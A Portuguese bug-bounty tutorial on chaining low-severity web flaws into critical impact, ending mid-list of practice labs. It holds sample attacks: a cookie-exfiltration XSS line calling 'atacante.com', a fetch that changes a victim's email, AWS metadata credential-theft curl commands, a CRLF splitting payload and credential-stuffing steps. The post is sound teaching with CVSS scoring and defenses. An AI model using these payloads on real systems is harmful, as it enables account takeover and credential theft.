---
title: "Chaining de Vulnerabilidades: somando falhas 'pequenas' em algo crítico"
description: "Como pensar em primitivas e encadear bugs de baixa severidade até um impacto crítico — open redirect → roubo de token OAuth, SSRF → cloud metadata → credenciais → RCE, XSS → account takeover, senha hardcoded → 2FA → ATO e outras cadeias clássicas, com CVSS v3.1 e v4.0, anonimizadas e passo a passo."
author: matheus
date: 2026-06-03 23:35:00 -0300
categories: [Bug Bounty, Avançado]
tags: ["vulnerability chaining", "exploit chain", "OAuth", "SSRF", "XSS", "IDOR", "CRLF", "subdomain takeover", "hardcoded password", "2FA", "RCE", "CVSS", "primitives", "bug bounty", "web security"]
image: /assets/img/covers/chaining-vulnerabilidades.png
pin: false
comments: true
---

## Dois "low" que viram um "critical"

Você acha um **Open Redirect**. Manda o report. Volta: *"Informational, sem impacto direto. Obrigado."* R$0.

Uma semana depois você percebe que aquele mesmo redirect mora **dentro do fluxo de login social** do alvo. Você o usa pra desviar o **token de autenticação** pro seu servidor. De repente o report deixou de ser "redirecionamento bobo" e virou **roubo de conta de qualquer usuário** — pago como crítico.

Não mudou a falha. Mudou a **história**. Esse é o coração do *chaining*: o que importa não é a severidade isolada de cada bug, é o **impacto da cadeia inteira**. Um caçador júnior reporta falhas avulsas; um sênior **conecta** falhas e entrega um impacto que o programa não tem como ignorar.

> 💡 **ATO (Account Takeover)**: tomada de conta — o atacante passa a controlar a conta de outro usuário (logar como ele, agir como ele). É o impacto "crítico" clássico. ([Glossário](/posts/fundamentos-web-hacking/))

> Este é um post avançado. Se algum elo aqui for novidade, cada cadeia linka pro post dedicado da série. Vale ler [Severidade, impacto e triagem](/posts/severidade-impacto-triagem/) antes — chaining é, no fundo, engenharia de impacto.

## O que é vulnerability chaining (e por que ele paga mais)

**Vulnerability chaining** (ou *exploit chain*) é encadear duas ou mais falhas, onde a **saída de uma vira a entrada da seguinte**, até chegar num impacto que nenhuma delas alcançaria sozinha.

> **Analogia:** uma fechadura ruim no portão dos fundos não é grande coisa. Uma janela que não trava, também não. Mas *portão ruim → quintal → janela destravada → cofre com a chave embaixo do tapete* é um assalto completo. Cada elo é "bobo"; a corrente é um arrombamento.

Por que isso multiplica o bounty e impressiona o triador:

- **O triador paga pelo impacto final, não pela classe.** Um open redirect sozinho é *Informational/Low*. O mesmo redirect como peça de um **Account Takeover** é *High/Critical*. Você não inventou impacto — você **demonstrou** o caminho até ele.
- **Tira o "não há impacto demonstrável".** O motivo nº 1 de report rejeitado é justamente esse. A cadeia entrega o impacto numa bandeja.
- **Mostra senioridade.** Qualquer scanner acha um reflected XSS. Conectar XSS → roubo de sessão → ação privilegiada mostra que você entende o sistema, não só a sintaxe do payload.

> 📊 **A regra de ouro do CVSS numa chain: pontue o RESULTADO, não as peças.** Cada elo, isolado, tem um score baixo — um open redirect dá `CVSS:3.1` ~6.1, um info disclosure de UUID, ~5.3. Some-os e você ainda tem "vários médios". O erro é reportar a **média** ou os elos separados. A cadeia inteira é **um** achado, e seu vetor descreve o **impacto final**: se o resultado é ATO de qualquer conta, o vetor é o de ATO (`C:H/I:H` ou `VC:H/VI:H` em v4.0), não o do redirect. Ao longo do post, cada cadeia mostra o **v3.1 e o v4.0 do impacto final** — é assim que você justifica o "Crítico" sem inflar. O **v4.0** ([FIRST, 2023](https://www.first.org/cvss/calculator/4.0)) é especialmente útil aqui porque separa impacto **no sistema** (`VC/VI/VA`) de impacto **subsequente** (`SC/SI/SA`) — e chain é, por definição, dano que pula de um sistema/contexto pro outro. Calibragem fina no post [Severidade & Impacto](/posts/severidade-impacto-triagem/).

> 💡 **Primitiva**: o "poder bruto" que uma falha te dá (ler um arquivo, escrever num campo, forçar uma requisição). É o tijolo com que você constrói a cadeia. [Glossário](/posts/fundamentos-web-hacking/)

## Pensa em primitivas, não em "bugs"

A virada de chave mental do chaining é parar de pensar *"que bug é esse?"* e começar a pensar *"que **primitiva** isso me dá?"*. Uma primitiva é uma capacidade concreta. Cadeias nascem quando uma primitiva alimenta a próxima.

| Falha | Primitiva que ela te dá |
|---|---|
| [Open Redirect](/posts/open-redirect/) | **Desviar a navegação/um valor** da vítima pra um destino que você controla |
| [SSRF](/posts/ssrf/) | **Fazer requisições server-side** (de dentro da rede do alvo) |
| [XSS](/posts/xss-html-injection/) | **Executar JavaScript** no contexto/origem da vítima (ler DOM, cookies, fazer requests autenticadas) |
| [IDOR/BOLA](/posts/broken-access-control-idor-bola-bfla/) | **Ler/escrever objeto de outro usuário** |
| Information Disclosure | **Vazar um valor** que você não deveria ver (ID, token, e-mail, versão) |
| Hardcoded secret / credencial-padrão | **Uma credencial pronta** (senha-padrão, chave, token) embutida no front/repo |
| [CRLF Injection](/posts/crlf-request-smuggling/) | **Injetar na resposta HTTP** (headers e/ou corpo) |
| [LFI/Path Traversal](/posts/lfi-path-traversal/) | **Ler arquivos arbitrários** do servidor |
| [Subdomain Takeover](/posts/subdomain-takeover-broken-link-hijacking/) | **Servir conteúdo seu sob um host legítimo** do alvo |

> 💡 **SSRF (Server-Side Request Forgery)**: você faz o **servidor** do alvo disparar uma requisição pra um endereço que você escolhe — útil pra alcançar serviços internos que você nunca acessaria de fora. ([Glossário](/posts/fundamentos-web-hacking/))

A pergunta-motor do chaining é simples e você repete o tempo todo:

> **"E se eu ligar o X com o Y?"** — Tenho um vazamento de UUID (X) e um IDOR que precisava justamente de um UUID válido (Y)? Liguei. Tenho um redirect (X) e um fluxo OAuth que confia no `redirect_uri` (Y)? Liguei.

Daqui pra frente, cada cadeia segue o mesmo esqueleto: **Primitiva inicial → ponte → impacto final**.

---

## Cadeia 1 — Open Redirect → roubo de token OAuth

A clássica que abriu o post. Sozinho, o open redirect quase não vale; ligado ao login social, vira ATO.

> 💡 **OAuth**: protocolo de "login com Google/Facebook/etc." e de autorização entre apps. Em vez de dar sua senha pro app, o provedor devolve um **token** pra ele. [Glossário](/posts/fundamentos-web-hacking/)

> 💡 **`redirect_uri`**: o endereço pra onde o provedor OAuth manda o `code`/`token` depois que você autoriza. É **o** parâmetro que o atacante quer controlar. [Glossário](/posts/fundamentos-web-hacking/)

**Primitivas:** open redirect em `app.exemplo.com` + validação fraca de `redirect_uri` no fluxo OAuth.

**O passo a passo:**

1. **Acho o redirect.** Em `app.exemplo.com` existe um endpoint que reflete a URL de destino sem validar o host:
   ```
   https://app.exemplo.com/go?next=//atacante.com   # <- sai do domínio: redirect aberto
   ```
2. **Vejo como o `redirect_uri` é validado.** Muitos provedores fazem *prefix match*: aceitam qualquer `redirect_uri` que **comece** com o domínio confiável. Ou seja, `https://app.exemplo.com/...` passa — mesmo que dentro dele haja um redirect aberto.
3. **Monto a URL de autorização** apontando o `redirect_uri` pro **open redirect do próprio alvo**:
   ```http
   GET /authorize?client_id=123&response_type=token
       &redirect_uri=https://app.exemplo.com/go?next=//atacante.com   # <- elo da cadeia
       &scope=profile HTTP/2
   Host: login.provedor.com
   ```
   Uso `response_type=token` (fluxo *implicit*): o token volta no **fragmento** (`#access_token=...`) da URL.
4. **Engano a vítima** a clicar no link enquanto está logada no provedor. Ela autoriza (ou já autorizou antes — aí nem clica em nada), o provedor responde `302 Location: https://app.exemplo.com/go?next=//atacante.com#access_token=...`, e o `/go` **redireciona pro meu servidor levando o fragmento junto**.
   > 💡 **Por que o `#access_token` sobrevive ao redirect:** o fragmento (`#...`) nunca é enviado ao servidor — fica no browser. Mas, por **convenção dos navegadores** (comportamento do WHATWG Fetch/URL — a [RFC 9110 §10.2.2](https://www.rfc-editor.org/rfc/rfc9110#name-location) define o `Location` como *partial-URI*, mas **não exige** isso), quando o `Location` de um `3xx` **não tem fragmento próprio**, o navegador **reanexa o fragmento da URL original** ao novo destino. Como `//atacante.com` não traz fragmento, o `#access_token=...` é herdado e cai no meu domínio. É exatamente esse comportamento que faz a cadeia funcionar.
5. **Capturo o token.** Meu servidor (ou um pouco de JS lendo `location.hash` na minha página) recebe `#access_token=...`. Com ele, chamo a API do provedor **como a vítima**. Account Takeover.

**Por que funciona:** o provedor validou só que o `redirect_uri` *começava* com o host confiável — e o host confiável tinha um redirect aberto. Detalhes do fluxo no post de [Account Takeover](/posts/account-takeover/) e do trampolim em [Open Redirect](/posts/open-redirect/).

> 📊 **Como pontuar (resultado = ATO via roubo de token):** sozinho, o open redirect é `CVSS:3.1` ~6.1 (Médio); ninguém paga crítico por ele. Mas o **impacto da chain** é tomar a conta de qualquer usuário, então você pontua o ATO: **v3.1 9.3 (Crítico)** `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N` · **v4.0 9.3 (Crítico)** `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N`. Repare: **mesmo com `UI:R`** (a vítima precisa abrir o link) já é **Crítico** — quem puxa pra 9.3 é a combinação `Scope:Changed` + `C:H/I:H` (o dano cai na conta da vítima, *outro* sistema), não a interação. Se o ataque dispara sozinho (`UI:N`), beira **10.0**. Note: o `S:C` (v3.1) e o `SC:H/SI:H` (v4.0) refletem que o dano acontece **num outro sistema** — a conta da vítima no provedor —, exatamente o que o trampolim faz.

> ⚠️ Mesmo no fluxo *authorization code*, dá pra encadear. Aqui o `code` volta na **query string** (`?code=...`), não no fragmento — então a captura é diferente: ou o open redirect repassa a query inteira pro atacante, ou um recurso externo na página de callback **vaza o `code` via header `Referer`**. De posse do `code`, o atacante o troca por token. (PortSwigger documenta as duas variantes em [OAuth](https://portswigger.net/web-security/oauth).)

---

## Cadeia 2 — SSRF → cloud metadata → credenciais → escalada

A cadeia que transforma um "o servidor faz uma request estranha" em **comprometimento da infra**.

> 💡 **Cloud metadata**: um serviço interno que toda VM em nuvem expõe num IP fixo (`169.254.169.254`) com dados da instância — incluindo, às vezes, **credenciais temporárias** da role atribuída a ela. [Glossário](/posts/fundamentos-web-hacking/)

**Primitivas:** SSRF (forço o servidor a fazer requests) + um endpoint de metadados que devolve credenciais + uma role com permissões generosas.

> 💡 **IMDS / IMDSv2**: o *Instance Metadata Service* — é justamente esse serviço de metadados em `169.254.169.254`. A **v2** exige pegar um token antes de ler (um freio anti-SSRF); a v1 não exigia nada. ([Glossário](/posts/fundamentos-web-hacking/))

**O passo a passo (AWS, IMDSv2):**

1. **Tenho um SSRF.** Algum recurso onde a app busca uma URL que eu controlo — importador de imagem por URL, webhook, gerador de PDF, preview de link. Confirmo com [OAST/Burp Collaborator](/posts/ssrf/) que a saída sai **de dentro** da rede do alvo.
2. **Aponto pro endpoint de metadados.** O IMDSv2 exige um **token** obtido via `PUT` antes do `GET`. Se eu controlo só a URL e não os headers, isso pode bloquear — mas muitos SSRFs permitem método/headers, ou o alvo ainda aceita IMDSv1 (sem token). Com IMDSv2:
   ```bash
   # 1) pega o token de sessão (PUT com header de TTL)
   TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
           -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
   # 2) usa o token pra listar a role e ler as credenciais
   curl -H "X-aws-ec2-metadata-token: $TOKEN" \
        http://169.254.169.254/latest/meta-data/iam/security-credentials/         # nome da role
   curl -H "X-aws-ec2-metadata-token: $TOKEN" \
        http://169.254.169.254/latest/meta-data/iam/security-credentials/NOME_DA_ROLE
   ```
3. **Recebo credenciais temporárias.** A resposta traz `AccessKeyId`, `SecretAccessKey` e `Token` (STS) da role da instância.
4. **Escalo — e, muitas vezes, chego a RCE.** Com a CLI da nuvem, exporto essas chaves e **assumo a identidade do servidor**: leio buckets, filas, bancos — tudo que aquela role puder tocar. Se a role for over-privileged (comum), o impacto vira *full account compromise*. E há um elo a mais que fecha em **execução de código**: se a role tem `ssm:SendCommand` (AWS Systems Manager) ou `lambda:UpdateFunctionCode`/`InvokeFunction`, você **roda comandos no host** ou injeta código numa Lambda — credenciais cloud viram **[RCE](/posts/rce-command-injection-ssti/)** sem precisar de mais nenhuma falha de aplicação. (Mapa dos vetores cloud — S3, segredos, IMDS, escalada IAM — no post [Cloud / AWS Misconfiguration](/posts/cloud-aws-misconfiguration/).)

**Por que funciona:** SSRF dá o poder de bater no `169.254.169.254`, que normalmente só a própria VM alcança — e esse endpoint distribui credenciais. A primitiva "request server-side" virou "credenciais de produção" — e, com a permissão IAM certa, virou **comando executado no servidor**. Aprofundamento em [SSRF](/posts/ssrf/), na superfície cloud em [Cloud / AWS Misconfiguration](/posts/cloud-aws-misconfiguration/) e no salto pra execução em [RCE](/posts/rce-command-injection-ssti/).

> 📊 **Como pontuar (resultado = comprometimento da infra / RCE):** o SSRF "cego" isolado costuma cair em Médio; aqui o impacto final é credenciais de produção (e, com IAM folgada, RCE), então você pontua o **comprometimento**: **v3.1 9.1–9.9** ex.: `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` (9.9, role over-privileged, exige só uma conta logada pra acionar o SSRF) · **v4.0 9.4 (Crítico)** `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H`. Se o SSRF é acionável **sem autenticação** (`PR:N`), vai a **10.0**. O `SC/SI/SA:H` do v4.0 captura bem o caso: o estrago vaza da app pra **toda a conta cloud**.

> ⚠️ **IMDSv2 não é mágica.** Ele mitiga SSRFs simples (só-URL) porque exige o `PUT`+token e nega `PUT` com `X-Forwarded-For`. Mas SSRFs que controlam método/headers ainda chegam lá. A defesa de verdade é **bloquear `169.254.169.254` na saída** e **forçar IMDSv2 com hop limit 1**.

---

## Cadeia 3 — XSS → roubo de sessão / CSRF → Account Takeover

XSS refletido isolado costuma pagar pouco (e às vezes é classificado como *Low*). Encadeado, vira controle de conta.

> 💡 **Sessão**: a credencial que mantém você "logado" entre requests — normalmente um cookie ou token. Quem rouba a sessão **vira você** sem precisar da senha. [Glossário](/posts/fundamentos-web-hacking/)

> 💡 **CSRF (Cross-Site Request Forgery)**: enganar o navegador da vítima pra disparar uma ação autenticada que ela não quis (a request sai com os cookies dela). A "proteção CSRF" é um token secreto que valida que a ação partiu da página legítima. ([Glossário](/posts/fundamentos-web-hacking/))

**Primitivas:** XSS (executo JS na origem da vítima) + ausência de `HttpOnly`/proteção CSRF + um fluxo sensível (trocar e-mail/senha).

**Dois caminhos, dependendo das defesas:**

**Caminho A — roubo de cookie (se faltar `HttpOnly`):**
```javascript
// payload do XSS armazenado/refletido
new Image().src = 'https://atacante.com/c?'+document.cookie;  // <- exfiltra a sessão
```
Pego o cookie, reuso, estou logado como a vítima.

**Caminho B — o XSS *executa a ação* (mesmo com `HttpOnly`):**
Cookie `HttpOnly` o JS não lê — mas o JS roda **na origem da vítima**, com a sessão dela. Então não preciso roubar o cookie: eu **disparo a request privilegiada de dentro**, o que de quebra anula a proteção CSRF (a request sai do contexto legítimo):
```javascript
// troca o e-mail da conta usando a própria sessão da vítima
fetch('/api/account/email', {
  method: 'POST',
  credentials: 'include',                 // <- vai com o cookie HttpOnly junto
  headers: {'Content-Type':'application/json',
            'X-CSRF-Token': document.querySelector('meta[name=csrf]').content}, // pego o token do DOM
  body: JSON.stringify({email: 'atacante@evil.com'})
});
// depois disparo o "esqueci a senha" pro novo e-mail -> ATO
```

**Por que funciona:** XSS é, na prática, *executar código como a vítima*. Daí pra ATO é só escolher qual ação valiosa disparar. Note como esse caminho **dispensa o roubo de cookie** — é a resposta pra quem acha que `HttpOnly` sozinho mata XSS. Variações de payload e contexto em [XSS](/posts/xss-html-injection/); o fluxo de ATO em [Account Takeover](/posts/account-takeover/).

> 💡 **Padrão de impacto que o triador adora:** um XSS sozinho às vezes é *Low*; "XSS no host X **mais** o swap de sessão que rouba o JWT (JSON Web Token — um token de sessão/login assinado, transportado em cookie ou header) ou o cookie" costuma ser o que **destrava** o impacto alto. Sem o vetor de roubo, a story fica fraca.

> 📊 **Como pontuar (resultado = ATO):** um reflected XSS isolado é ~6.1 (Médio). Encadeado até tomar a conta, você pontua o ATO **com a interação que o XSS exige** (a vítima abre o link/página): **v3.1 9.3 (Crítico)** `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N` · **v4.0 9.3 (Crítico)** `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N`. Se for **stored** XSS num lugar que a vítima visita no fluxo normal (sem link enviado), dá pra defender `UI:N`/`UI:P` e o score sobe. O Caminho B (XSS executa a ação) tem o mesmo impacto final, mesmo com `HttpOnly` — o cookie não sai, mas a conta cai igual.

---

## Cadeia 4 — IDOR + Information Disclosure → vazamento em massa

Às vezes o IDOR sozinho não fecha porque o identificador **não é adivinhável** (UUID, hash). A peça que falta é um vazamento que te entrega os IDs.

**Primitivas:** Information Disclosure (vaza identificadores) + IDOR (lê objeto por identificador) → **enumeração em escala**.

**O passo a passo:**

1. **Acho o IDOR, mas trava no ID.** O endpoint `GET /api/clientes/{uuid}` devolve dados de qualquer cliente — só que `uuid` é um UUID v4, impossível de chutar. IDOR "real", impacto "teórico".
2. **Caço o vazamento de IDs.** Um endpoint de listagem/busca, um JS, uma notificação ou um e-mail expõe os identificadores. Exemplo: uma rota de "busca pública" devolve, sem precisar de autorização, os UUIDs:
   ```http
   GET /api/search?q=a HTTP/2
   Host: app.exemplo.com

   HTTP/2 200 OK
   [{"uuid":"4f9c...-a1","nome":"Cliente A"}, {"uuid":"7b2d...-c3","nome":"Cliente B"}, ...]
   ```
3. **Ligo os dois.** Coletei centenas de UUIDs (X) → alimento o IDOR (Y), enumerando:
   ```http
   GET /api/clientes/4f9c...-a1 HTTP/2   # nome, CPF, endereço de quem nunca conheci
   GET /api/clientes/7b2d...-c3 HTTP/2   # próximo da lista
   ```
4. **Demonstro escala.** Com [Burp Intruder](/posts/recon-discovery/) percorrendo a lista de UUIDs vazados, baixo PII (*Personally Identifiable Information* — dados pessoais que identificam alguém: nome, CPF, e-mail, endereço) de **toda a base**. Saiu de "IDOR com ID inadivinhável" pra **vazamento massivo de dados pessoais** — agora cai em [LGPD](/posts/broken-access-control-idor-bola-bfla/) e severidade crítica.

**Por que funciona:** o IDOR sempre teve a primitiva de leitura; faltava o **espaço de busca**. O disclosure preencheu. Como reportar IDOR com impacto e escala está em [Broken Access Control](/posts/broken-access-control-idor-bola-bfla/).

> 📊 **Como pontuar (resultado = vazamento de PII em massa):** um IDOR de leitura isolado já é ~6.5; o que sobe o score é o **escopo cruzar pra outras contas** + a **escala**. Vetor: **v3.1 7.7 (Alto)** `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` (o `S:C` reflete dado de *outro* usuário; só confidencialidade, daí `I:N/A:N`) · **v4.0 8.3 (Alto)** `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N`. Muitos programas pagam como **Crítico** pela escala + LGPD, mesmo com o vetor em Alto — argumente o **número de registros** e a sensibilidade (CPF), como detalhado em [Severidade & Impacto](/posts/severidade-impacto-triagem/).

---

## Cadeia 5 — CRLF → response splitting → XSS / cache poisoning

CRLF injection sozinho ("consegui injetar um header") costuma ser *Low*. Encadeado, vira XSS sem campo de input — ou pior, **envenena o cache pra todo mundo**.

> 💡 **Cache poisoning**: fazer um proxy/CDN **guardar** uma resposta maliciosa e **servi-la a outros usuários** que nem chegaram a tocar no seu payload. [Glossário](/posts/fundamentos-web-hacking/)

**Primitivas:** CRLF (`%0d%0a` injeta na resposta) → controlar headers e/ou o corpo da resposta.

**O passo a passo:**

1. **Confirmo o CRLF.** Um parâmetro reflete `%0d%0a` (CR LF = fim de linha do HTTP) num header da resposta:
   ```http
   GET /redir?url=/%0d%0aX-Injetado:teste HTTP/2   # <- a quebra cria um header novo
   Host: app.exemplo.com
   ```
   Se `X-Injetado: teste` aparece na resposta, controlo a estrutura dela.
2. **Faço response splitting → XSS.** Injeto duas quebras (`%0d%0a%0d%0a` encerra os headers e abre o **corpo**) e escrevo HTML:
   ```
   /redir?url=/%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(document.domain)</script>
   ```
   O navegador renderiza meu HTML como se fosse a página — **XSS sem nenhum campo de input**, vindo de um header.
3. **Escalo pra cache poisoning.** Se um CDN/proxy cacheia essa resposta por uma chave que a vítima também usa, meu HTML malicioso passa a ser **servido a todos** que pedirem a mesma URL — vira XSS persistente em escala, sem precisar enganar ninguém individualmente.

**Por que funciona:** a primitiva do CRLF é "escrever na resposta". Escrever um header → XSS. Fazer essa resposta ser cacheada → impacto coletivo. Mecânica do `%0d%0a` e de smuggling em [CRLF Injection e Request Smuggling](/posts/crlf-request-smuggling/).

> ⚠️ Nem todo CRLF vira XSS: browsers e proxies modernos mitigam parte do response splitting. Mas mesmo só "injetar header" pode habilitar outras cadeias (ex.: setar um cookie de sessão controlado → *session fixation*).

---

## Cadeia 6 — Subdomain Takeover → roubo de cookie / phishing no domínio da vítima

Um subdomínio "dangling" parece inofensivo até você perceber o que ele **herda** do domínio-pai: confiança, cookies e credibilidade.

**Primitivas:** Subdomain Takeover (sirvo conteúdo meu sob `sub.alvo.com`) + cookies/CORS com escopo amplo + a confiança que o usuário tem no domínio.

**O passo a passo:**

1. **Acho o dangling DNS.** `promo.alvo.com` tem um `CNAME` apontando pra um serviço (S3/Pages/Heroku) que foi **desprovisionado**. Confirmo com `dig` e a fingerprint de "não reclamado" (detalhes em [Subdomain Takeover](/posts/subdomain-takeover-broken-link-hijacking/)).
2. **Reivindico o recurso.** Crio o bucket/app com aquele nome — agora **eu** sirvo o conteúdo de `promo.alvo.com`. O subdomínio é "meu", mas com a marca e o domínio do alvo.
3. **Encadeio com cookies de escopo amplo.** Se o alvo seta cookies pra `.alvo.com` (domínio-pai), o navegador os envia também pra `promo.alvo.com`. Meu JS lá hospedado **lê e exfiltra** cookies não-`HttpOnly` da sessão da vítima — ou, com CORS mal configurado confiando em `*.alvo.com`, faço requests autenticadas pra API principal.
4. **Ou monto o phishing perfeito.** Hospedo uma página de "re-login" idêntica sob `promo.alvo.com` — **URL legítima, HTTPS válido**. A vítima digita as credenciais sem desconfiar, porque está, de fato, num subdomínio do alvo.

**Por que funciona:** o takeover dá um *ponto de apoio dentro do perímetro de confiança* do alvo. Cookie amplo + CORS folgado + confiança do usuário transformam "subdomínio abandonado" em roubo de sessão ou phishing premium. Recon e confirmação em [Subdomain Takeover e Broken Link Hijacking](/posts/subdomain-takeover-broken-link-hijacking/).

---

## Cadeia 7 — Senha hardcoded no JS → enumeração de usuários → 2FA do atacante → ATO

Essa cadeia mostra que chaining não é só primitiva web clássica: aqui os elos são um **info disclosure no front-end**, **reuso de credencial** e uma **falha no fluxo de 2FA**. Sozinho, "tem uma senha no JavaScript" rende um Médio morno. Encadeado, vira ATO de contas internas.

**Primitivas:** senha-padrão fixada no JS (information disclosure) + lista de usuários enumerável + 2FA que pode ser **registrado pela primeira vez** sem provar posse da conta.

**O passo a passo:**

1. **Acho a senha hardcoded.** No bundle do front (`main.<hash>.js`) existe uma **senha-padrão de reset** embutida — algo como uma constante usada no fluxo de "primeiro acesso". Procuro por padrões como `login.novaSenha` ou strings de senha (`Senha@123`) no JS minificado.
   > 💡 Se *source maps* estiverem habilitados, o JS desofuscado expõe ainda mais — vale checar `.js.map`. (Onde segredos vazam no front: [Cloud / AWS Misconfiguration](/posts/cloud-aws-misconfiguration/) e [Security Misconfiguration](/posts/security-misconfiguration-cve-hunting/).)
2. **Monto a lista de usuários.** A senha sozinha não serve sem *contra quem* usá-la. Coleto e-mails corporativos do domínio (OSINT de e-mails/funcionários) e derivo os **logins** removendo o `@dominio` — viram uma wordlist de usuários prováveis.
3. **Ligo os dois — credential stuffing com a senha-padrão.** Para cada usuário da lista, tento logar com a senha-padrão vazada. Quem **nunca** trocou a senha de primeiro acesso (sempre tem alguém) entra.
4. **Sequestro o 2FA.** Nas contas onde o login funcionou mas o **2FA ainda não foi configurado**, o app me deixa **cadastrar o segundo fator no meu próprio dispositivo** (TOTP/telefone). A partir daí a conta é minha de ponta a ponta — inclusive contra o dono legítimo. ATO completo.

**Por que funciona:** cada peça é "pequena" — uma senha exposta, uma lista de e-mails pública, um 2FA que confia em quem chega primeiro. Juntas, contornam autenticação **e** o segundo fator. O detalhe que fecha a cadeia é o **2FA registrável sem prova de posse**: se o app exigisse a senha *atual* (não a padrão) ou verificasse posse antes de enrolar o fator, o último elo cairia. Fluxo de ATO e bypass de 2FA a fundo em [Account Takeover](/posts/account-takeover/).

> 📊 **Como pontuar (resultado = ATO de contas internas, sem login prévio):** o atacante é anônimo até logar, então o vetor é de ATO não-autenticado: **v3.1 9.8 (Crítico)** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (conta o lock-out do dono como `A:H`) · **v4.0 9.3 (Crítico)** `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N`. Mesmo que "só" funcione em quem não trocou a senha-padrão, o impacto por conta tomada é total.

> ⚠️ **Pare no PoC mínimo.** Esta cadeia mira **contas reais de pessoas**. Demonstre com **uma** conta (idealmente de teste/sua, ou com autorização explícita do programa), não enumere a base inteira. Logar em conta alheia sem autorização é crime — veja a [Nota ética](#nota-ética).

---

## Metodologia: como caçar cadeias de propósito

Chaining não é sorte — é método. Depois do recon, faça isto:

1. **Inventário de primitivas.** Pra cada achado (mesmo os "low" e "info"), anote a **primitiva**, não o nome: *"redirect aberto em `/go`"*, *"vaza UUID em `/search`"*, *"reflexão de header via CRLF"*. Mantenha essa lista do lado.
2. **Mapeie os "sinks" valiosos.** Onde mora o impacto? Fluxo de login/OAuth, troca de e-mail/senha, área de pagamento, endpoints de admin, integrações em nuvem. São os destinos pra onde você quer levar suas primitivas.
3. **Pergunte "e se eu ligar X com Y?"** sistematicamente. Cruze cada primitiva com cada sink:
   - *Tenho um disclosure de ID?* → tem IDOR esperando esse ID?
   - *Tenho um redirect?* → tem OAuth/SSO que confia em `redirect_uri`?
   - *Tenho um SSRF?* → roda em nuvem? alcança metadata/serviços internos?
   - *Tenho um XSS?* → que ação privilegiada eu disparo da origem da vítima?
   - *Tenho um self-XSS (só na minha conta)?* → tem login CSRF / um jeito de logar a vítima na minha conta pra transformar em XSS "de verdade"?
   - *Achei uma senha/chave hardcoded?* → tem como derivar uma lista de usuários (e-mails do domínio) e reusar? o 2FA pode ser cadastrado pela primeira vez sem provar posse?
4. **Construa o caminho mais curto até o impacto mais alto.** Pare quando a história ficar inegável.

> 💡 **Ouro escondido:** falhas que sozinhas "não têm impacto" (self-XSS, open redirect, CSRF de login, info disclosure) são **peças premium de cadeia**. Não descarte — guarde no inventário. Muito report rejeitado por "sem impacto" volta como crítico quando ganha um segundo elo.

## Como reportar um chain (sem perder o impacto no caminho)

O erro fatal é reportar os elos **separados** — cada um cai como *Low* e você perde o crítico. Reporte a **cadeia como uma narrativa única**, mostrando o caminho completo do início ao impacto final:

1. **Resumo orientado a impacto, primeiro.** *"Encadeando um open redirect com a validação fraca de `redirect_uri` no login social, um atacante assume a conta de qualquer usuário (ATO)."* O triador precisa ver o **crítico** na primeira linha.
2. **Liste os elos como uma cadeia numerada.** Elo 1 (primitiva) → Elo 2 (ponte) → Impacto. Deixe explícito como a **saída de um vira entrada do outro**.
3. **PoC ponta a ponta.** Não pare no `alert(1)` nem no "header injetado". Vá **até** o token roubado / a conta tomada / a PII enumerada. Prints e requests de cada elo. (Formato campeão em [Como escrever um report que paga](/posts/como-escrever-report-que-paga/).)
4. **Justifique a severidade pela cadeia, citando CVSS/impacto final** — não pela média dos elos. Argumentação de severidade em [Severidade, impacto e triagem](/posts/severidade-impacto-triagem/).
5. **Antecipe o "downgrade".** Se um elo depender de interação do usuário (clicar num link), diga isso e mostre por que ainda é realista.

## Defesa: quebre qualquer elo e a cadeia cai

A boa notícia da defesa: você **não precisa** consertar tudo. Toda cadeia tem o impacto que tem porque **todos** os elos falharam. **Quebre um elo e o crítico não se forma.**

- **OAuth (Cadeia 1):** valide `redirect_uri` por **match exato** (allowlist), nunca por prefixo; use `state`; prefira *authorization code + PKCE* ao *implicit*. **E** elimine open redirects (allowlist de destinos).
- **SSRF/metadata (Cadeia 2):** **bloqueie `169.254.169.254`** e ranges internos na saída; **force IMDSv2** com *hop limit 1*; aplique **least privilege** na role da instância (mesmo com SSRF, role sem permissão = pouco dano).
- **XSS/ATO (Cadeia 3):** *output encoding* + [CSP](/posts/xss-html-injection/) matam o XSS; cookies `HttpOnly`+`Secure`+`SameSite` e **re-autenticação em ações sensíveis** (pedir senha pra trocar e-mail) quebram o passo final.
- **IDOR+disclosure (Cadeia 4):** **checagem de dono** por objeto no servidor (mata o IDOR) **e** não vaze identificadores em endpoints sem autorização.
- **CRLF (Cadeia 5):** **nunca** reflita input em headers; sanitize `\r`/`\n`; configure o cache pra **não cachear** respostas com input refletido.
- **Subdomain Takeover (Cadeia 6):** higiene de DNS (remova `CNAME` ao desprovisionar); cookies com escopo **mínimo** (host-only, não `.alvo.com`); CORS sem curinga em subdomínio.
- **Hardcoded → 2FA (Cadeia 7):** **nunca** embuta credenciais/senhas-padrão no front-end (nem em source maps); **force a troca** da senha de primeiro acesso; e exija **prova de posse** (senha atual ou link de verificação) antes de **registrar** o primeiro fator de 2FA — não confie em "quem chega primeiro".

**Princípio mestre:** *defense in depth* existe justamente porque uma camada falha. Cada controle redundante é **um elo a menos** disponível pra quem encadeia.

## Ferramentas + labs legais

- **Burp Suite** — Repeater (testar cada elo), Intruder (enumerar na Cadeia 4), Collaborator/OAST (confirmar SSRF na Cadeia 2). Veja [Recon & Discovery](/posts/recon-discovery/).
- **Labs autorizados pra praticar cadeias:**
